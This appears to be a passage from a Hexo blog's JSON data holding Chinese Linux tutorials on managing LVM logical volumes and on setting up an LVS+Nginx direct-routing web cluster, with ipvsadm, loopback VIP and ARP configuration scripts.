href=\"#逻辑卷\" class=\"headerlink\" title=\"逻辑卷\"></a>逻辑卷</h3><ul>\n<li>创建逻辑卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvcreate -L 200M qavg -n qa</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>qavg</code>这个卷组创建一个叫<code>qa</code>大小为200M的逻辑卷。这里的<strong>L选项</strong>指定的是平常讲的磁盘的大小。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvcreate -l 45 qavg -n qa</span><br></pre></td></tr></table></figure>\n\n<p>使用<strong>l选项</strong>是指定的逻辑的块多少，比如上面创建卷组时指定的一个块的大小是16M，这里指定45个，逻辑卷的大小就是720M</p>\n<ul>\n<li>扩容逻辑卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend -L +54 /dev/qavg/qa</span><br></pre></td></tr></table></figure>\n\n<p>这个是指在原来逻辑卷的基础上再增加54Mib的存储空间。但增加不能超过卷组的总容量大小。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend qavg/qa /dev/sdk3</span><br></pre></td></tr></table></figure>\n\n<p>使用卷组里<code>/dev/sdk3</code>这个物理卷的全部空间为<code>qavg/qa</code>扩容。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9</span><br></pre></td></tr></table></figure>\n\n<p>使用卷组里<code>/dev/sda</code>的8-9M的空间和<code>/dev/sdb</code>的8-9M的空间为逻辑卷<code>qavg/qa</code>扩容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvextend -l+100%FREE -r qavg/qa</span><br></pre></td></tr></table></figure>\n\n<p>使用卷组所有剩余的空间为<code>qavg/qa</code>扩容。</p>\n<ul>\n<li>查看逻辑卷详细信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvdisplay</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>查看逻辑卷精简信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvs</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除逻辑卷</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lvremove qa</span><br></pre></td></tr></table></figure>\n\n<p>这块的命令虽然看着挺多，但是3大类都是一个逻辑。创建，查看，删除这都是一样的，无非就是扩容的命令得记一下。加油少年！</p>"},{"title":"使用LVS+Nginx配置DR模式的Web集群","date":"2023-05-18T14:13:29.000Z","_content":"\n### 准备工作\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|:---:|:---:|:---:|:---:|:---:|:---:|\n|DS|调度服务器|ens224|仅主机|172.21.8.80/24|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|nginx|\n|web1|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|nginx|\n|web2|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n\nPS:\n\n1. 建议DS（调度机）的网卡使用仅主机模式的。\n2. web1和web2的loopback网卡都要设置为DS主机的metric值大的那一张网卡。\n<!-- more -->\n3. 可以使用```route -n```查看**metric**值。\n4. **metric**值可以在网卡配置文件中修改，修改后记得重启网络服务生效。\n\n### DS主机配置\n\n```bash\nipvsadm -A -t 172.21.8.80:80 -s wrr\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2\nipvsadm --set 1 1 1\n```\n\n调度策略中，前面的这个IP是调度机虚拟出来的VIP，后面的这个IP是真实Web服务器的IP地址。\n\n也可以直接编辑成一个脚本文件，方便后面进行策略的调整\n\n```bash\n#!/bin/bash\nipvsadm -C\nipvsadm -A -t 10.8.7.10:80 -s wrr\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2\nipvsadm --set 1 1 1\necho \"轮巡策略已成功添加！！！\"\n```\n\n### Web1主机和Web2主机配置\n\n* 配置回环接口（VIP）\n\n```bash\nip addr add 172.21.8.80/32 dev lo\n```\n\n因为环回口配置的IP在每次重启之后都会丢失IP，每次配置起来也比较麻烦，同样的把他写成一个脚本\n\n```bash\n#!/bin/bash\nip addr add 10.8.7.10/32 dev lo:1\necho \"VIP 已经成功添加到loopback口。\"\n```\n\n* 修改Web1内核控制系统arp响应\n\n  因为要修改4个文件，设置的值也比较简单。只有在使用LVS+Nginx配置DR模式的时候才会将这4个文件设置为该值，平常使用要使用默认值。为了切换方便一点，建议使用脚本的方式。\n\n```bash 折叠代码\n#!/bin/bash\nif [ $# -ne 1 ]\nthen\n    echo 'error!'\"usage:$0 on|off\"\n    exit 1\nfi\ncase $1 in\n    on)\n        echo \"1\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"1\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已开启！\"\n        ;;\n    off)\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已关闭！\"\n        ;;\n    *)\n        echo 'error!'\"usage:$0 on|off\"\n        exit 1\nesac\n```\n\n* 执行脚本\n\n```bash\nchmod +x lvs_dr.sh\n./lvs_dr.sh on\n```\n\n### 测试\n\n1. 在Web1、Web2启动Nginx。\n2. 分别执行```curl 172.21.8.20```，```curl 172.21.8.30```。验证无误后，在客户端（第4台机器）上测试```curl 172.21.8.80```，使用**DR**机器是不好使的。\n\n>版权声明：以上的shell脚本知识产权由私人所有，禁止商用。","source":"_posts/LVS-Nginx-DR.md","raw":"---\ntitle: 使用LVS+Nginx配置DR模式的Web集群\ndate: 2023-05-18 22:13:29\ncategories: 技术\ntags:\n  - Linux\n---\n\n### 准备工作\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|:---:|:---:|:---:|:---:|:---:|:---:|\n|DS|调度服务器|ens224|仅主机|172.21.8.80/24|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|nginx|\n|web1|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|nginx|\n|web2|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n\nPS:\n\n1. 建议DS（调度机）的网卡使用仅主机模式的。\n2. web1和web2的loopback网卡都要设置为DS主机的metric值大的那一张网卡。\n<!-- more -->\n3. 可以使用```route -n```查看**metric**值。\n4. **metric**值可以在网卡配置文件中修改，修改后记得重启网络服务生效。\n\n### DS主机配置\n\n```bash\nipvsadm -A -t 172.21.8.80:80 -s wrr\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2\nipvsadm --set 1 1 1\n```\n\n调度策略中，前面的这个IP是调度机虚拟出来的VIP，后面的这个IP是真实Web服务器的IP地址。\n\n也可以直接编辑成一个脚本文件，方便后面进行策略的调整\n\n```bash\n#!/bin/bash\nipvsadm -C\nipvsadm -A -t 10.8.7.10:80 -s wrr\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2\nipvsadm --set 1 1 1\necho \"轮巡策略已成功添加！！！\"\n```\n\n### Web1主机和Web2主机配置\n\n* 配置回环接口（VIP）\n\n```bash\nip addr add 172.21.8.80/32 dev lo\n```\n\n因为环回口配置的IP在每次重启之后都会丢失IP，每次配置起来也比较麻烦，同样的把他写成一个脚本\n\n```bash\n#!/bin/bash\nip addr add 10.8.7.10/32 dev lo:1\necho \"VIP 已经成功添加到loopback口。\"\n```\n\n* 修改Web1内核控制系统arp响应\n\n  因为要修改4个文件，设置的值也比较简单。只有在使用LVS+Nginx配置DR模式的时候才会将这4个文件设置为该值，平常使用要使用默认值。为了切换方便一点，建议使用脚本的方式。\n\n```bash 折叠代码\n#!/bin/bash\nif [ $# -ne 1 ]\nthen\n    echo 'error!'\"usage:$0 on|off\"\n    exit 1\nfi\ncase $1 in\n    on)\n        echo \"1\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"1\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已开启！\"\n        ;;\n    off)\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已关闭！\"\n        ;;\n    *)\n        echo 'error!'\"usage:$0 on|off\"\n        exit 1\nesac\n```\n\n* 执行脚本\n\n```bash\nchmod +x lvs_dr.sh\n./lvs_dr.sh on\n```\n\n### 测试\n\n1. 在Web1、Web2启动Nginx。\n2. 分别执行```curl 172.21.8.20```，```curl 172.21.8.30```。验证无误后，在客户端（第4台机器）上测试```curl 172.21.8.80```，使用**DR**机器是不好使的。\n\n>版权声明：以上的shell脚本知识产权由私人所有，禁止商用。","slug":"LVS-Nginx-DR","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5e8002t7zj32bsmharn","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>需要最少准备三台虚拟机，关闭selinx和防火墙。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n<th align=\"center\">软件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">调度服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.80&#x2F;24</td>\n<td align=\"center\">ipvsadm</td>\n</tr>\n<tr>\n<td align=\"center\">web1</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.20&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web1</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">lo(VIP)</td>\n<td align=\"center\">-</td>\n<td align=\"center\">172.21.8.80&#x2F;32</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web2</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.30&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web2</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">lo(VIP)</td>\n<td align=\"center\">-</td>\n<td align=\"center\">172.21.8.80&#x2F;32</td>\n<td align=\"center\">nginx</td>\n</tr>\n</tbody></table>\n<p>PS:</p>\n<ol>\n<li>建议DS（调度机）的网卡使用仅主机模式的。</li>\n<li>web1和web2的loopback网卡都要设置为DS主机的metric值大的那一张网卡。<span id=\"more\"></span></li>\n<li>可以使用<code>route -n</code>查看<strong>metric</strong>值。</li>\n<li><strong>metric</strong>值可以在网卡配置文件中修改，修改后记得重启网络服务生效。</li>\n</ol>\n<h3 id=\"DS主机配置\"><a href=\"#DS主机配置\" class=\"headerlink\" title=\"DS主机配置\"></a>DS主机配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -A -t 172.21.8.80:80 -s wrr</span><br><span class=\"line\">ipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1</span><br><span class=\"line\">ipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2</span><br><span class=\"line\">ipvsadm --<span class=\"built_in\">set</span> 1 1 1</span><br></pre></td></tr></table></figure>\n\n<p>调度策略中，前面的这个IP是调度机虚拟出来的VIP，后面的这个IP是真实Web服务器的IP地址。</p>\n<p>也可以直接编辑成一个脚本文件，方便后面进行策略的调整</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">ipvsadm -C</span><br><span class=\"line\">ipvsadm -A -t 10.8.7.10:80 -s wrr</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2</span><br><span class=\"line\">ipvsadm --<span class=\"built_in\">set</span> 1 1 1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;轮巡策略已成功添加！！！&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Web1主机和Web2主机配置\"><a href=\"#Web1主机和Web2主机配置\" class=\"headerlink\" title=\"Web1主机和Web2主机配置\"></a>Web1主机和Web2主机配置</h3><ul>\n<li>配置回环接口（VIP）</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip addr add 172.21.8.80/32 dev lo</span><br></pre></td></tr></table></figure>\n\n<p>因为环回口配置的IP在每次重启之后都会丢失IP，每次配置起来也比较麻烦，同样的把他写成一个脚本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">ip addr add 10.8.7.10/32 dev lo:1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;VIP 已经成功添加到loopback口。&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>修改Web1内核控制系统arp响应</p>\n<p>因为要修改4个文件，设置的值也比较简单。只有在使用LVS+Nginx配置DR模式的时候才会将这4个文件设置为该值，平常使用要使用默认值。为了切换方便一点，建议使用脚本的方式。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> -ne 1 ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;error!&#x27;</span><span class=\"string\">&quot;usage:<span class=\"variable\">$0</span> on|off&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"variable\">$1</span> <span class=\"keyword\">in</span></span><br><span class=\"line\">    on)</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;LVS DR 模式已开启！&quot;</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    off)</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;LVS DR 模式已关闭！&quot;</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    *)</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;error!&#x27;</span><span class=\"string\">&quot;usage:<span class=\"variable\">$0</span> on|off&quot;</span></span><br><span class=\"line\">        <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">esac</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>执行脚本</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> +x lvs_dr.sh</span><br><span class=\"line\">./lvs_dr.sh on</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><ol>\n<li>在Web1、Web2启动Nginx。</li>\n<li>分别执行<code>curl 172.21.8.20</code>，<code>curl 172.21.8.30</code>。验证无误后，在客户端（第4台机器）上测试<code>curl 172.21.8.80</code>，使用<strong>DR</strong>机器是不好使的。</li>\n</ol>\n<blockquote>\n<p>版权声明：以上的shell脚本知识产权由私人所有，禁止商用。</p>\n</blockquote>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>需要最少准备三台虚拟机，关闭selinx和防火墙。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n<th align=\"center\">软件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">调度服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.80&#x2F;24</td>\n<td align=\"center\">ipvsadm</td>\n</tr>\n<tr>\n<td align=\"center\">web1</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.20&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web1</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">lo(VIP)</td>\n<td align=\"center\">-</td>\n<td align=\"center\">172.21.8.80&#x2F;32</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web2</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.30&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web2</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">lo(VIP)</td>\n<td align=\"center\">-</td>\n<td align=\"center\">172.21.8.80&#x2F;32</td>\n<td align=\"center\">nginx</td>\n</tr>\n</tbody></table>\n<p>PS:</p>\n<ol>\n<li>建议DS（调度机）的网卡使用仅主机模式的。</li>\n<li>web1和web2的loopback网卡都要设置为DS主机的metric值大的那一张网卡。</li></ol>","more":"\n<li>可以使用<code>route -n</code>查看<strong>metric</strong>值。</li>\n<li><strong>metric</strong>值可以在网卡配置文件中修改，修改后记得重启网络服务生效。</li>\n\n<h3 id=\"DS主机配置\"><a href=\"#DS主机配置\" class=\"headerlink\" title=\"DS主机配置\"></a>DS主机配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -A -t 172.21.8.80:80 -s wrr</span><br><span class=\"line\">ipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1</span><br><span class=\"line\">ipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2</span><br><span class=\"line\">ipvsadm --<span class=\"built_in\">set</span> 1 1 1</span><br></pre></td></tr></table></figure>\n\n<p>调度策略中，前面的这个IP是调度机虚拟出来的VIP，后面的这个IP是真实Web服务器的IP地址。</p>\n<p>也可以直接编辑成一个脚本文件，方便后面进行策略的调整</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">ipvsadm -C</span><br><span class=\"line\">ipvsadm -A -t 10.8.7.10:80 -s wrr</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1</span><br><span class=\"line\">ipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2</span><br><span class=\"line\">ipvsadm --<span class=\"built_in\">set</span> 1 1 1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;轮巡策略已成功添加！！！&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Web1主机和Web2主机配置\"><a href=\"#Web1主机和Web2主机配置\" class=\"headerlink\" title=\"Web1主机和Web2主机配置\"></a>Web1主机和Web2主机配置</h3><ul>\n<li>配置回环接口（VIP）</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip addr add 172.21.8.80/32 dev lo</span><br></pre></td></tr></table></figure>\n\n<p>因为环回口配置的IP在每次重启之后都会丢失IP，每次配置起来也比较麻烦，同样的把他写成一个脚本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span 